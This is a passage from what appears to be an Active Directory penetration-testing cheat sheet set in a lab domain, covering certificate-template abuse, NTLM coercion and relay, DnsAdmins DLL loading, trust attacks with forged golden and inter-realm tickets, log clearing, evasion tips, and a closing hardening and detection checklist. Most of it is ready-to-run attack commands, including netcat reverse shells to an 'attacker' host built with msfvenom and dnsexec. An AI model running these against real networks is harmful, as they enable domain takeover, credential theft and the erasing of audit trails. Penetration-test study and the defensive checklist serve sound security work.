- SpoolSample (RpcRemoteFindFirstPrinterChangeNotification) - MS-RPRN
- PrinterBug (same as SpoolSample, by leechristensen)
- DFSCoerce (MS-DFSNM)
- ShadowCoerce (MS-FSRVP)
- Coercer (multi-protocol coercion)
- chek4.coercer
```

## 15.9 - ADCS ESC Catalog (Summary)

| ESC | Description | Detection |
|-----|-------------|-----------|
| **ESC1** | Enrollee supplies subject + low priv can enroll | Certify / Certipy find |
| **ESC2** | Any Purpose / SubCA template | Certify |
| **ESC3** | Enrollment Agent template abuse | Certify |
| **ESC4** | Vulnerable ACL on CA/template | Certify / BloodHound |
| **ESC5** | Vulnerable ACL on CA host (machine account) | BloodHound |
| **ESC6** | EDITF_ATTESTREQUESTONLY on CA (any SAN) | Certipy find |
| **ESC7** | Manage CA access (enroll, manage certificates) | Certipy find |
| **ESC8** | HTTP enrollment (relay to certsrv) | LDAPRelayScan + ntlmrelayx |
| **ESC9** | No security extension on template | Certipy |
| **ESC10** | Weak certificate mapping (UPN/DNS) | Certipy |
| **ESC11** | IF_ENROLLMENT_AGENT and ENROLLEE_SUPPLIES_SUBJECT | Certipy |
| **ESC13** | Issuance policy attached to template (RBCD chain) | Certipy |
| **ESC14** | Weak explicit mapping (any SPN) | Certipy |
| **ESC15** | SchemaV2 with application policies + EKU = Client Auth | Certipy |

```bash
# ESC1 — request cert as any user
certipy req -u user@inlanefreight.local -p 'pass' -target 172.16.5.5 -ca INLANEFREIGHT-CA -template Vulnerable -upn administrator@inlanefreight.local
# Auth as administrator
certipy auth -pfx administrator.pfx -dc-ip 172.16.5.5

# ESC8 — relay
# Terminal 1
ntlmrelayx.py -t http://172.16.5.45/certsrv -adcs -template DomainController -smb2support
# Terminal 2
petitpotam.py <attacker> <dc>
```

---

# PHASE 16: MISC MISCONFIGURATIONS

## 16.1 - Exchange-related Privileges
```powershell
# Exchange "Write DACL" on Domain object → DCSync
# 1. Exchange Trusted Subsystem / Exchange Enterprise / Organization Management groups often have this
# PrivExchange (original)
python3 privexchange.py -d inlanefreight.local -u user -p 'pass' -ah attacker_ip
# Push subscription → relay on Exchange
python3 privexchange.py -d inlanefreight.local -u user -p 'pass' -ah attacker_ip --relay
# Or use MailSniper + push subscription (in NTLM relay)
# Or just check ACLs
Get-DomainObjectAcl -ResolveGUIDs -Identity "DC=inlanefreight,DC=local" | ?{$_.IdentityReference -match "Exchange"}
```

## 16.2 - Printer Bug (MS-RPRN)
```bash
# Coerce any user to auth to us → relay or capture
python3 printerbug.py inlanefreight.local/user:'pass'@<target> <attacker_ip>
# Or SpoolSample
.\SpoolSample.exe <target> <attacker>
```

## 16.3 - MS14-068
```bash
# Old but classic — for exam
python3 ms14-068.py -u user@inlanefreight.local -p pass -s user_sid -d dc01.inlanefreight.local
# Use the resulting ccache for arbitrary access (DA path via Enterprise Admins)
```

## 16.4 - DNS Admins (DllHijacking → DC)
> **Members of DnsAdmins can load a DLL into DNS service on DC. DC runs DNS service as SYSTEM → code execution on DC.**

```cmd
# 1. Create DLL
# msfvenom or custom
msfvenom -p windows/x64/exec CMD='C:\nc64.exe -e cmd.exe attacker 4444' -f dll -o evil.dll
# 2. Stop DNS service
sc \\DC01 stop dns
# 3. Replace dns.exe / load DLL
# dnscmd or sc command to set service DLL
# (Often via registry: HKLM\System\CurrentControlSet\services\dns\ImagePath = "dnscmd.exe ...")
# 4. Restart service
sc \\DC01 start dns
# 5. DLL executes as SYSTEM on DC
```

```bash
# Impacket's dnsexec
dnsexec.py inlanefreight.local/dnsadmin:'pass'@DC01 -command 'C:\nc64.exe -e cmd.exe attacker 4444'
```

## 16.5 - Group Policy Preferences (GPP) cpassword
```bash
# Already covered in Phase 11.4
# Decrypt
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

## 16.6 - Audit/Logon Scripts via GPO (SharpGPOAbuse)
```powershell
# Need: GenericAll / WriteDACL on a GPO linked to an OU
# Or higher: write to the GPOLink

# SharpGPOAbuse
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Evil" --Author "ADMIN" --Command "cmd.exe" --Arguments "/c powershell -enc ..." --GPOName "Default Domain Policy"
# Or
.\SharpGPOAbuse.exe --AddUserScript --ScriptName "evil.bat" --ScriptContents "<...>" --GPOName "Default Domain Policy"
# Wait for policy refresh (up to 90 min + random offset)
gpupdate /force  # Manual on target
```

## 16.7 - MSSQL Abuse
```bash
# Linked servers (see Phase 12.3)
# Coercion via xp_dirtree
SQL> EXEC xp_dirtree '\\attacker\share'
# Or xp_fileexist
SQL> EXEC xp_fileexist '\\attacker\share'
# Then Responder to capture NetNTLMv2
# Or ntlmrelayx for relay
```

## 16.8 - Certificates (ESC1-ESC15) — see Phase 15.9

## 16.9 - adidnsdump
```bash
# Linux
python3 adidnsdump.py inlanefreight.local -u user@inlanefreight.local -p 'pass' -r
# Output: records.csv
cat records.csv | head
# Anonymous (if allowed)
python3 adidnsdump.py inlanefreight.local --no-auth
```

## 16.10 - Constrained Delegation / RBCD Abuse
```bash
# Constrained delegation
impacket-GetUserSPNs inlanefreight.local/user:'pass' -dc-ip 172.16.5.5 -target-user <delegation_user>
# Or via RBCD (RBCD)
# Already covered in Phase 13.3.4
```

## 16.11 - LAPS Not In Use
```
- Check if LAPS installed on hosts
- If not, local admin passwords often shared/reused
- netexec smb 172.16.5.0/24 --local-auth -u administrator -H <hash>
```

## 16.12 - IPv6 Takeover
- Already covered in Phase 3.2

## 16.13 - WebClient Service Abuse
```
- WebClient service (WebDav) running on Win hosts
- Coerce → NTLM auth to WebDAV
- NTLMRelayx to ADCS or DC
```

## 16.14 - RBCD Coercion Chains
```
- Use coerce methods to force a target to authenticate to us
- Relay to LDAP → set RBCD on target
- Get ST as any user → impersonate admin on target
```

---

# PHASE 17: DOMAIN TRUSTS

> **Trigger:** Found multiple domains/forests in scope. BloodHound shows trust edges. `Get-ADTrust` or `nltest` reveals trusts.

## 17.1 - Trust Enumeration

### Linux
```bash
# ldapsearch (read trust attributes)
ldapsearch -h 172.16.5.5 -D 'user@inlanefreight.local' -w 'pass' -b "DC=inlanefreight,DC=local" -s sub "(&(objectclass=trustedDomain))" | grep -E "distinguishedName|trustDirection|trustType|trustAttributes"

# Look for: trustDirection (0/1/2/3), trustType (1/2/3/4/5), trustAttributes (0x4/0x8/0x10/0x20/0x40)

# Or via impacket (auto)
python3 -c "
from impacket.ldap import ldap_connection
# ... see impacket examples
"

# BloodHound
# Trust edges shown visually under Analysis → Trusts
# Mark our owned principals → "Shortest Paths from Owned Principals"

# Pull via ldap3 directly
python3 << 'EOF'
from ldap3 import Server, Connection, ALL, SUBTREE
s = Server('172.16.5.5', get_info=ALL)
c = Connection(s, user='inlanefreight.local\\user', password='pass', auto_bind=True)
c.search('DC=inlanefreight,DC=local', '(&(objectclass=trustedDomain))', search_scope=SUBTREE, attributes=['name','trustDirection','trustType','trustAttributes','flatName','trustPartner'])
for e in c.entries: print(e)
EOF
```

### Windows
```cmd
# nltest (most basic)
nltest /domain_trusts
nltest /dsgetdc:<domain> /PTROFF
# Get all trusts in forest
nltest /domain_trusts /all_trusts

# PowerView (most thorough)
Get-DomainTrust
Get-DomainTrust -Domain inlanefreight.local
Get-DomainTrustMapping
Get-ForestTrust
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"  # Trusted for delegation

# AD Module
Get-ADTrust -Filter *
Get-ADTrust -Identity "FREIGHTLOGISTICS.LOCAL"
Get-ADForest
Get-ADDomainController -Discover -Service PrimaryDC
Get-ADUser -Filter {TrustedForDelegation -eq $true}
```

## 17.2 - Trust Direction & Type

```
Direction (trustDirection):
- DISABLED (0)
- INBOUND (1): this domain trusts the other
- OUTBOUND (3): other domain trusts this one
- BIDIRECTIONAL (2): both ways

Type (trustType):
- WINDOWS_NON_TRANSITIVE (1): single trust, not transitive
- WINDOWS_TRANSITIVE (2): transitive (e.g., parent-child)
- MIT (3): MIT Kerberos
- DCE (4): DCE
- AAD (5): Azure AD

Attributes (trustAttributes - bitwise OR):
- TRUST_ATTRIBUTE_NON_TRANSITIVE (0x1): explicitly non-transitive
- TRUST_ATTRIBUTE_UPLEVEL_ONLY (0x4): Windows 2000+ only
- TRUST_ATTRIBUTE_FILTER_SIDS (0x8): SID filtering enabled
- TRUST_ATTRIBUTE_FOREST_TRANSITIVE (0x10): trust transitivity
- TRUST_ATTRIBUTE_CROSS_ORGANIZATION (0x20): cross-org (no transitive across)
- TRUST_ATTRIBUTE_WITHIN_FOREST (0x40): within forest
- TRUST_ATTRIBUTE_TRUST_USES_RC4_ENCRYPTION (0x80): legacy RC4
- TRUST_ATTRIBUTE_TRUST_USES_AES_KEYS (0x100): AES
- TRUST_ATTRIBUTE_CROSS_ORGANIZATION_NO_TGT_DELEGATION (0x200): no TGT delegation
- TRUST_ATTRIBUTE_TRUST_USES_SEALING_PUBLIC_KEY (0x400)
- TRUST_ATTRIBUTE_TRUST_USES_PROVABLE_RANDOM_KEY (0x800)
- TRUST_ATTRIBUTE_PIM_TRUST (0x1000): PAM

Key SID mapping for attack:
- S-1-5-21-<DOMAIN>-500: Administrator
- S-1-5-21-<DOMAIN>-502: krbtgt
- S-1-5-21-<DOMAIN>-512: Domain Admins
- S-1-5-21-<DOMAIN>-519: Enterprise Admins (forest-wide)
- S-1-5-32-544: Built-in Administrators
- S-1-3-0: Creator Owner
```

### Common Trust Topologies

```
Parent-Child (intra-forest, TRANSITIVE):
  INLANEFREIGHT.LOCAL (parent)
  └── LOGISTICS.INLANEFREIGHT.LOCAL (child)
  Both directions: BIDIRECTIONAL + WITHIN_FOREST
  TrustAttributes bit 6 = 0x40 (within forest)
  ⇒ SID filtering NOT applied (intra-forest)
  ⇒ Exploit: SID History injection (ExtraSids / raiseChild.py)

Tree-Root (intra-forest):
  INLANEFREIGHT.LOCAL (forest root)
  └── EU.INLANEFREIGHT.LOCAL (new tree root in same forest)
  Same attack surface as parent-child

External (cross-domain, NON-TRANSITIVE):
  INLANEFREIGHT.LOCAL (one-way or two-way external)
  FREIGHTLOGISTICS.LOCAL
  TrustAttributes has FILTER_SIDS (0x8) and CROSS_ORGANIZATION (0x20)
  ⇒ SID filtering enabled
  ⇒ TGT delegation across trust is blocked (no TGT forwarding)
  ⇒ Exploit: cross-forest Kerberoasting, foreign group members, trust key forges

Forest Trust (cross-forest, TRANSITIVE within each):
  INLANEFREIGHT.LOCAL
  FREIGHTLOGISTICS.LOCAL
  ⇒ Trust key extraction → forge inter-realm TGT
  ⇒ Cross-forest Kerberoasting
  ⇒ Foreign group members (often via migration)

MIT (Kerberos-only, 3rd-party):
  Usually for cross-platform auth
  ⇒ Limited attack surface
```

## 17.3 - Trust Key Extraction

```cmd
# Windows - mimikatz (requires DA on the trusting domain)
mimikatz.exe
privilege::debug
lsadump::trust /patch
# Returns trust key (RC4 or AES) and trust attributes

# Domain controller secretsdump
# Mimikatz uses in-process LSARPC calls — only works on DC
```

```bash
# Linux - impacket secretsdump
secretsdump.py inlanefreight.local/Administrator:'pass'@<dc>
# In the output, look for entries like:
# [*] _kerberos.FREIGHTLOGISTICS.LOCAL/inlanefreight.local:plain_password_hex:0c41a2b8...
# OR
# [\$] .__USERS__.FREIGHTLOGISTICS.LOCAL/inlanefreight.local:aes256-cts-hmac-sha1-96:0a8b7c...
# The hex string IS the trust key

# Or specifically
secretsdump.py inlanefreight.local/Administrator:'pass'@<dc> | grep -i "FREIGHTLOGISTICS\|trust"
```

## 17.4 - Child → Parent Privilege Escalation (SID History)

> **EXTRASID: When a user has a SID in their SID-History attribute from the parent domain, KDC includes it in service tickets. E.g., Enterprise Admins SID in child user's ticket → EA access in parent.**

### Windows — Mimikatz Method
```cmd
# 1. Need DA in CHILD domain
# 2. Extract krbtgt hash of CHILD
lsadump::dcsync /user:logistics\krbtgt
# 3. Forge a Golden Ticket with Enterprise Admins SID in SID-History
#    (use the S-1-5-21-<parent_sid>-519 SID)
kerberos::golden /user:Administrator /domain:logistics.inlanefreight.local /sid:S-1-5-21-<logistics_sid> /krbtgt:<logistics_krbtgt_hash> /sids:S-1-5-21-<inlanefreight_sid>-519 /ptt
# 4. Now we have EA rights in the parent forest
# 5. DCSync parent domain
lsadump::dcsync /user:inlanefreight\krbtgt
```

### Linux — raiseChild.py (Automated)
```bash
# Auto: extract child DC hash, forge golden ticket with EA SID, exec on parent DC
python3 raiseChild.py -target-ip <parent_dc_ip> -second-target-ip <child_dc_ip> -username child_admin -password 'pass' -command 'whoami /all'

# Or with hashes
python3 raiseChild.py -target-ip <parent_dc_ip> -second-target-ip <child_dc_ip> -username child_admin -hashes :<child_admin_hash> -command 'whoami /all'

# Or dump parent hashes
python3 raiseChild.py -target-ip <parent_dc_ip> -second-target-ip <child_dc_ip> -username child_admin -password 'pass' -dump
# Output: parent domain hashes

# Use case: DA in child → DA in parent
```

### Step-by-Step Manual
```bash
# 1. Get child domain krbtgt hash (via DCSync from compromised DA in child)
secretsdump.py logistics.inlanefreight.local/Administrator:'pass'@<child_dc> -just-dc-user krbtgt

# 2. Get child domain SID
# (any AD user SID starts with the domain SID)
lookupsid.py logistics.inlanefreight.local/Administrator:'pass'@<child_dc> 0

# 3. Get parent domain SID (look for Enterprise Admins)
lookupsid.py inlanefreight.local/Administrator:'pass'@<parent_dc> 0
# Or
# The 519 RID in the parent SID = Enterprise Admins

# 4. Forge ticket
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-<child_sid> -domain logistics.inlanefreight.local -extra-sid S-1-5-21-<parent_sid>-519 -spn krbtgt -groups 512 Administrator

# 5. Use ticket
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass inlanefreight.local/Administrator@<parent_dc> -just-dc
```

## 17.5 - Cross-Forest Trust Abuse

### 17.5.1 - Trust Key → Forge Inter-Realm TGT

```bash
# 1. Get trust key (from DC of trusting domain via secretsdump)
secretsdump.py inlanefreight.local/Administrator:'pass'@<inlanefreight_dc> | grep -i "FREIGHTLOGISTICS"
# Extract the trust key (rc4 or aes)

# 2. Forge inter-realm TGT
ticketer.py -nthash <trust_key> -domain-sid S-1-5-21-<inlanefreight_sid> -domain inlanefreight.local -extra-sid S-1-5-21-<freight_sid>-519 target_user

# 3. Use ticket to access target forest as target_user with EA rights
export KRB5CCNAME=target_user.ccache
psexec.py -k -no-pass FREIGHTLOGISTICS.LOCAL/target_user@<target_dc>
```

```cmd
# Windows - Rubeus
.\Rubeus.exe golden /user:target_user /domain:inlanefreight.local /sid:S-1-5-21-<inlanefreight_sid> /rc4:<trust_key> /sids:S-1-5-21-<freight_sid>-519 /ptt
# Then access target forest
dir \\<target_dc>\C$
```

### 17.5.2 - Cross-Forest Kerberoasting

```bash
# Linux
impacket-GetUserSPNs inlanefreight.local/user:'pass' -target-domain FREIGHTLOGISTICS.LOCAL -dc-ip <freight_dc> -request
# Crack with hashcat -m 13100 (RC4) or -m 19700 (AES)

# kerbrute
kerbrute kerberoast -d FREIGHTLOGISTICS.LOCAL --dc <freight_dc> users_in_freight.txt
```

```powershell
# Windows - Rubeus
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /dc:<freight_dc> /spns:*/<freight_dc>
```

### 17.5.3 - Foreign Group Members (ACROSS TRUSTS)

```powershell
# PowerView - find foreign users in our domain
Get-DomainForeignUser -Domain inlanefreight.local
Get-DomainForeignGroupMember -Domain inlanefreight.local

# In BloodHound:
# "Find All Foreign Domain Group Memberships"
# "Find Users with Foreign Domain Group Membership"
# Look for users from a different forest/domain that are members of our privileged groups
```

### 17.5.4 - SID Filtering / Quarantine

```
By default, cross-forest trusts:
- Filter SIDs (no SID history from outside)
- Quarantine (no TGT delivery across forest)
- Selective auth (require explicit ACE)

To bypass:
- Need to get a TGT in the target forest first
- Then use it from the trusting domain
- The trust key forge approach handles this (mimikatz extra-sid)
```

## 17.6 - Trust Decision Tree

```
Found a trust?
├── Parent-child (intra-forest)
│   ├── DA in child → use raiseChild.py / mimikatz ExtraSids → DA in parent
│   ├── Compromise child → DCSync child → get krbtgt → forge → DCSync parent
│   └── Cleanup: reset krbtgt password twice in child
├── Tree-root (intra-forest)
│   └── Same as parent-child
├── External (cross-domain, non-transitive)
│   ├── Trust key available? → forge inter-realm TGT
│   ├── User with SPN in target → cross-forest kerberoast
│   ├── Foreign group member → check for privileged group access
│   └── SID filtering blocks ExtraSids injection
├── Forest trust (cross-forest, transitive)
│   ├── Trust key + forge inter-realm TGT → EA in target
│   ├── Cross-forest kerberoast
│   └── Same SID filtering as external
└── MIT (Kerberos-only)
    └── Limited attack surface
```

## 17.7 - Trust Attack Detection Events

```
- 4672: Special privileges (e.g., EA logon)
- 4769: Kerberos service ticket (TGS) — look for cross-domain SPN
- 4781: Account created
- 4738: Account changed
- 16655: S4U2Self requests
- 4734: Account deleted
- 4720: Account created
- 4624: Logon (look for cross-domain logons, type 3 network)
- 4662: Operation performed on object (DCSync)
```

---

# PHASE 18: CLEANUP & OPSEC

> **Trigger:** End of engagement. Restore any modified state to avoid detection or breakage.

## 18.1 - Restore Modified Objects

```powershell
# Remove SPN added during targeted kerberoast
Set-DomainObject -Identity <victim_user> -Clear serviceprincipalname
Set-DomainObject -Identity <victim_user> -Set @{"serviceprincipalname"="<original_value>"}

# Remove ACL entries we added
# (PowerView) — record what you added with Add-DomainObjectAcl
Remove-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <our_user> -Rights "All" -Verbose

# Remove group membership added
Remove-DomainGroupMember -Identity "Domain Admins" -Members "evil_user" -Verbose

# Remove RBCD entries
Set-DomainObject -Identity <target_computer> -Clear "msds-allowedtodelegateto"
# Or specifically:
Set-DomainObject -Identity <target_computer> -Set @{"msds-allowedtodelegateto"=$null}

# Remove shadow credentials
pywhisker.py -d inlanefreight.local -u user -p 'pass' --target target_user --action remove --device-id <id>
# Or via certipy
certipy shadow auto -username user@inlanefreight.local -p 'pass' -account target_user  # removes after retrieval
```

## 18.2 - Disable Created Accounts

```powershell
# Disable machine account we created
Get-ADComputer -Identity EvilMachine | Disable-ADAccount
Remove-ADComputer -Identity EvilMachine -Confirm:$false
# Or via PowerView
Set-DomainObject -Identity EvilMachine -Set @{"useraccountcontrol"=4096}  # WORKSTATION_TRUST_ACCOUNT

# Disable user account we created
Disable-ADAccount -Identity evil_user
Remove-ADUser -Identity evil_user -Confirm:$false
```

## 18.3 - Clear Logs

```cmd
# PowerShell logs
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Security log (admin required)
wevtutil cl Security
# But clearing Security log requires special privilege; some EDRs detect this

# System log
wevtutil cl System

# Application log
wevtutil cl Application

# Phant0m (kills ETW + thread)
Invoke-Phant0m -Target Winlogon
# Or
Invoke-Phant0m
```

## 18.4 - Remove Staged Payloads

```cmd
# On compromised hosts
del C:\Windows\Temp\SAM
del C:\Windows\Temp\SYSTEM
del C:\Windows\Temp\SECURITY
del C:\Windows\Temp\evil.exe
del C:\Windows\Temp\evil.dll
del C:\Users\Public\Downloads\*
# Remove scheduled tasks
schtasks /delete /tn "Evil" /f
# Remove services
sc delete "Evil"
# Remove registry keys
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /f
```

## 18.5 - Reset Changed Passwords (if instructed)

```powershell
# Force-reset a user's password back to original
Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString 'OriginalPass' -AsPlainText -Force)
# Note: may need to ask client for original pass, or document the change
```

## 18.6 - Removal of BloodHound Data

```bash
# Delete BloodHound zip and JSON files from compromised hosts
rm -f bh_data.zip *.json
# Or on Windows
del *.json
```

## 18.7 - OPSEC Checklist (during engagement, not just cleanup)

```
- [ ] Used PtH instead of cracking where possible
- [ ] Used Kerberos (4768/4769) instead of NTLM (4625) for spraying
- [ ] Used -k -no-pass when possible (no creds in transit)
- [ ] Avoided Mimikatz on target hosts (try SharpMiniDump or direct)
- [ ] Avoided 'mimikatz' keyword in payload names
- [ ] Used AMSI bypass only when needed
- [ ] Used PowerShell -ExecutionPolicy Bypass (avoid Set-ExecutionPolicy)
- [ ] Avoided reg save / mimikatz on Domain Controllers
- [ ] Used cme --local-auth for local admin instead of psexec.exe
- [ ] Used evil-winrm with ccache instead of password
- [ ] Used impacket tools that don't write to disk (wmiexec, dcomexec)
- [ ] Stayed away from 'Invoke-' for known-Mimikatz-related functions
```

---

# PHASE 19: HARDENING & REPORTING

## 19.1 - MITRE ATT&CK Coverage (Mapping All Attacks)

| Tactic | Technique | Example Tools |
|---|---|---|
| **TA0043 Recon** | T1595 Active Scanning | nmap, CME |
| | T1589 Gather Victim Identity | theHarvester, linkedin2username |
| | T1590 Gather Victim Network | Shodan, censys |
| | T1592 Gather Victim Host | subfinder |
| **TA0001 Initial Access** | T1078 Valid Accounts | spray, leaked creds |
| | T1189 Drive-by Compromise | web app attacks |
| | T1190 Exploit Public-Facing App | PrintNightmare, NoPac |
| | T1133 External Remote Services | RDP, WinRM open |
| **TA0002 Execution** | T1059 Command Interpreter | PowerShell, cmd |
| | T1053 Scheduled Task | SharpGPOAbuse, schtasks |
| | T1569 System Services | sc, dnsexec |
| | T1204 User Execution | LNK, SCF, .docm |
| **TA0003 Persistence** | T1543 Create Service | sc create, PrintNightmare |
| | T1136 Create Account | New-MachineAccount, evil_user |
| | T1098 Account Manipulation | ACL abuse, ForceChangePassword |
| | T1003 OS Credential Dumping | mimikatz, secretsdump, SharpDPAPI |
| | T1556 Modify Auth Process | Skeleton Key |
| | T1547 Boot/Logon Autostart | Run keys, GPO |
| **TA0004 Privilege Escalation** | T1068 Exploitation for PrivEsc | PrintNightmare, PrintSpoofer, GodPotato |
| | T1543 Create Service | PrintNightmare, GPO abuse |
| | T1078 Valid Accounts | spray, leaked creds |
| | T1484 Group Policy Modification | SharpGPOAbuse |
| | T1003 OS Credential Dumping | mimikatz, secretsdump |
| **TA0005 Defense Evasion** | T1562 Impair Defenses | wevtutil, Invoke-Phant0m |
| | T1070 Indicator Removal | log clearing, file deletion |
| | T1027 Obfuscated Files | AMSI bypass, -enc, base64 |
| | T1218 System Binary Proxy Execution | regsvr32, mshta |
| **TA0006 Credential Access** | T1110 Brute Force | CME, kerbrute, hydra |
| | T1558 Steal/Forge Kerberos Tickets | kerberoast, AS-REP, Golden Ticket |
| | T1003 OS Credential Dumping | mimikatz, secretsdump, SharpDPAPI |
| | T1552 Unsecured Credentials | GPP cpassword, description, autologon |
| | T1187 Forced Authentication | LLMNR, mitm6, printerbug |
| | T1557 ADCS abuse | Certify, certipy |
| **TA0007 Discovery** | T1087 Account Discovery | Get-DomainUser, net user |
| | T1083 File/Directory Discovery | Find-DomainFile, Snaffler |
| | T1018 Remote System Discovery | nmap, net view |
| | T1087.002 Domain Account | Get-DomainUser |
| | T1069 Permission Groups Discovery | net group, Get-DomainGroup |
| | T1016 System Network Config | nltest, ipconfig |
| | T1049 System Network Connections | netstat, Get-NetTCPConnection |
| | T1033 System Owner/User Discovery | whoami, userenum |
| | T1007 System Service Discovery | sc, net start |
| | T1120 Peripheral Device Discovery | Get-CachedRDPConnection |
| **TA0008 Lateral Movement** | T1021 Remote Services | RDP, WinRM, SSH, SMB |
| | T1021.002 SMB/Windows Admin Shares | psexec, wmiexec, smbexec |
| | T1021.001 Remote Desktop Protocol | xfreerdp, mstsc |
| | T1021.006 Windows Remote Management | evil-winrm, Enter-PSSession |
| | T1570 Lateral Tool Transfer | smbclient, evil-winrm upload |
| | T1550 Use Alternate Auth Material | PtH, PtT, Kerberos ticket forge |
| **TA0009 Collection** | T1005 Data from Local System | secretsdump, Snaffler, SharpDPAPI |
| | T1039 Data from Network Shared Drive | smbmap, Snaffler |
| | T1555 Credentials from Password Stores | browser creds, KeePass, Wi-Fi |
| **TA0011 Command & Control** | T1071 Application Layer Protocol | HTTPS reverse shell, SMB |
| | T1572 Protocol Tunneling | chisel, ligolo |
| **TA0006 / TA0008 / TA0010 Exfil** | T1133 External Remote Services | via established tunnel |
| **TA0010 Exfiltration** | T1041 Exfil over C2 channel | base64, scp |
| **TA0040 Impact** | T1486 Data Encrypted for Impact | SkeletonKey (DoS if mass-reset) |

## 19.2 - Detection Evasion Hygiene (Hypothetical real-world)

```
- [ ] Don't run `mimikatz.exe` directly (AV will catch hash)
- [ ] Use `Invoke-Mimikatz` from memory (less detection)
- [ ] Use SharpMiniDump + offline parse
- [ ] Use `sekurlsa::logonpasswords` only when necessary
- [ ] Prefer Rubeus over Mimikatz for Kerberos ops
- [ ] Don't drop `GetUserSPNs` to disk (run from memory)
- [ ] Use `kerbrute` instead of `GetUserSPNs.py` (less detection)
- [ ] Use `GetTGT.py` instead of `kekeo` for ticket acquisition
- [ ] Use Impacket's `secretsdump` instead of `mimikatz lsadump::dcsync`
- [ ] Use `ntlmrelayx` with `--no-smb-server` and `--no-http-server` when possible
- [ ] Avoid Spray + CrackMapExec brute (use kerbrute with `-v` only at end)
- [ ] Use BloodHound with `--stealth` or skip Session collection
- [ ] For ACL abuse, use Add-DomainObjectAcl only when needed
```

## 19.3 - Auditing Tools (Client-Facing Recommendations)

### PingCastle
```cmd
# Comprehensive AD security audit
PingCastle.exe --healthcheck --server <dc> --user user --password pass
# Generates HTML report
# Or
PingCastle.exe --advanced-live-data --server <dc>
```

### BloodHound
```powershell
# Already covered in Phase 7-8
# Recommend: Run SharpHound, set up Neo4j
# Identify "shortest path to Domain Admins"
# Identify stale objects, OUs without inheritance, etc.
```

### Group3r
```cmd
# GPO auditing tool
Group3r.exe -f inlanefreight.local -u user -p 'pass' -d DC01.inlanefreight.local
# Output: HTML report on GPO misconfigurations
```

### ADRecon
```powershell
# AD reporting
.\ADRecon.ps1 -DomainController <dc> -Credential (Get-Credential) -Forest
# Output: zip with CSV/JSON/HTML
```

### ADExplorer (Sysinternals)
```cmd
# GUI snapshot of AD
# Save as .dat, view offline
# Compare snapshots over time
```

### PlumHound / BloodHound Custom Queries
```
- "Find AS-REP Roastable Users"
- "Find Kerberoastable Users"
- "Find Computers with LAPS Enabled"
- "Find Computers with Old OS"
- "Find LAPS Without Protection"
- "Find GPOs Without Proper Filtering"
- "Find Stale Computer Objects"
- "Find Computers Trusted for Unconstrained Delegation"
- "Find Computers with RBCD Set"
```

## 19.4 - Hardening Checklist (For Engagement Report)

```
AUTHENTICATION & PASSWORD
- [ ] Enforce minimum 14-character passwords
- [ ] Disable NTLM where possible (force Kerberos)
- [ ] Implement tiered admin model (T0 = DA, T1 = Servers, T2 = Workstations)
- [ ] Require MFA for all admin accounts
- [ ] Implement smart card / FIDO2 for T0 accounts
- [ ] Rotate service account passwords regularly (or use gMSA)
- [ ] Audit and remove PASSWD_NOTREQD, ENCRYPTED_TEXT_PWD_ALLOWED, DONT_REQ_PREAUTH
- [ ] Set restrictive lockout policy (5-10 attempts, 30-min lockout)
- [ ] Use Microsoft "Protected Users" security group for T0

NETWORK
- [ ] Disable LLMNR / NBT-NS via GPO
- [ ] Disable WPAD (or run proxy server)
- [ ] Block outbound LDAP / SMB / HTTP at perimeter (prevent coercion relay)
- [ ] Enable SMB signing on all hosts (and require it via GPO)
- [ ] Enable LDAP signing + channel binding
- [ ] Implement tiered network segmentation (T0/T1/T2 VLANs)
- [ ] Disable IPv6 if not in use (or implement DHCPv6 guard / RA guard)
- [ ] Disable Print Spooler service where not needed (PrintNightmare mitigation)
- [ ] Disable WebClient service (CVE-2021-36942 mitigation)
- [ ] Firewall DC-to-DC RPC ports from workstations

ACL & PRIVILEGE
- [ ] Audit and clean up GenericAll, GenericWrite, WriteDACL, WriteOwner ACLs
- [ ] Use ACLs with explicit deny + allow (avoid Everyone full control)
- [ ] Implement "least privilege" group nesting
- [ ] Remove privileged users from "Protected from accidental deletion" ACLs only when needed
- [ ] Restrict "Domain Admins" logon to DCs only
- [ ] Implement Just-in-Time admin (JIT) with PAM tools
- [ ] Audit DCSync rights: only DCs should have Get-Changes + Get-Changes-All

KERBEROS
- [ ] Use AES-only tickets where possible (RC4 disable via GPO)
- [ ] Implement Kerberos armoring (FAST) for sensitive accounts
- [ ] Avoid service accounts with passwords (use gMSA / dMSA)
- [ ] Set msDS-SupportedEncryptionTypes=8 (AES) on service accounts
- [ ] Reduce max ticket lifetime (default 10h)
- [ ] Reset krbtgt password twice annually

ADCS
- [ ] Audit and remove ESC1-ESC15 vulnerable templates
- [ ] Set "Manager approval" on sensitive templates
- [ ] Disable EDITF_ATTESTREQUESTONLY (ESC6)
- [ ] Set "CA Certificate Manager Approval" on CA
- [ ] Audit CA ACLs (ESC4, ESC5, ESC7)
- [ ] Restrict HTTP enrollment (ESC8) to specific hosts
- [ ] Implement "CA certificate manager" group separation
- [ ] Rotate CA keys (Microsoft recommends annually)

DELEGATION
- [ ] Audit and remove unconstrained delegation
- [ ] Replace unconstrained with RBCD for legitimate needs
- [ ] Audit constrained delegation
- [ ] Set msDS-AllowedToDelegateTo on specific SPNs only
- [ ] Block machine account creation for non-admins (ms-DS-Machine-Account-Quota)

GPO
- [ ] Remove old GPP cpassword entries (pre-2014)
- [ ] Audit GPO link order
- [ ] Filter GPO scope appropriately (Security Filtering, WMI filters)
- [ ] Don't store credentials in GPO

AUDIT & DETECTION
- [ ] Enable advanced audit policy (logon/logoff, privilege use, account mgmt)
- [ ] Centralize logs (SIEM)
- [ ] Alert on:
  - 4625 spikes (spray)
  - 4769 for service accounts (kerberoast)
  - 4624 cross-domain logons
  - 4672 admin logons
  - 4720 new accounts
  - 4728 group membership changes
  - 4738 user modifications
  - 4662 on domain object (DCSync)
  - 4738 GPO changes
  - 5136 / 5137 object modifications
